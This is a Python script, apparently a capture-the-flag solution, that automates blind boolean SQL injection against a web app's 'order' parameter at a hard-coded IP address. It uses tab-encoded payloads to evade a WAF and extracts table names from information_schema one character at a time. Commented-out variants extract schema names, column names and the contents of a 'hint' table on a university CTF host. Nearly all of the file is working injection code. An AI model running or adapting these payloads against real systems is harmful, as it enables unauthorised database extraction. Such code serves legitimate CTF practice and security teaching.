#!/usr/bin/env python
# coding: UTF-8 （๑•̀ㅂ•́)و✧
__author__ = ''

import string
import requests

# url = 'http://ctf.hit.edu.cn:3004/user.php?id=3-(if(ascii(substr(user,1,1)),2,1))'
HEADERS = {
    "Host": "127.0.0.1:80",
    "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.107 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Connection": "keep-alive",
}
payloads = 'abcdefghijklmnopqrstuvwxyz!@%()<>?{}_/1234,56.7890 -'
res = ''
NULL_flag=0
for i in range(1, 45):
    check_flag=0

    for payload in payloads:
        url = 'http://58.154.33.13:8003/?order=if((select%%09mid((select%%09table_name%%09from%%09information_schema.tables%%09where%%09table_schema=database()%%09limit%%090,1),%d,1)=\'%c\'),(select%091union%09select2,1)' % (i,payload)
        #url='http://58.154.33.13:8003/?order=1\''
        print url
        #url = "http://ctf.hit.edu.cn:3004/user.php?id=3-(if((substr((select/**/group_concat(column_name)/**/from/**/information_schema.tables/**/where/**/table_schema='web5'/**/and/**/table_name='hint'),%d,1)='%s'),2,1))" % (i, payload)
        # url = "http://ctf.hit.edu.cn:3004/user.php?id=3-(if((substr((select/**/*/**/from/**/hint),%d,1)='%s'),2,1))" % (i, payload)
        # url = "http://ctf.hit.edu.cn:3004/user.php?id=3-(if((substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),%d,1)='%s'),2,1))" % (i, payload)
        # print url
        r = requests.get(url=url)
        sam=r.content.find('Sam',0)
        bob=r.content.find('Bob',0)
        if sam<bob :
            #print payload
            res += payload
            check_flag=1
            NULL_flag=0
            print res
            break
        elif 'Hacker' in r.content:
            print 'WAF!'
            exit()
        else:
            print '.',
    if check_flag==0:
        NULL_flag+=1
        print "Null 已达到: "+str(NULL_flag)
    if NULL_flag>3:
        break

print
print res


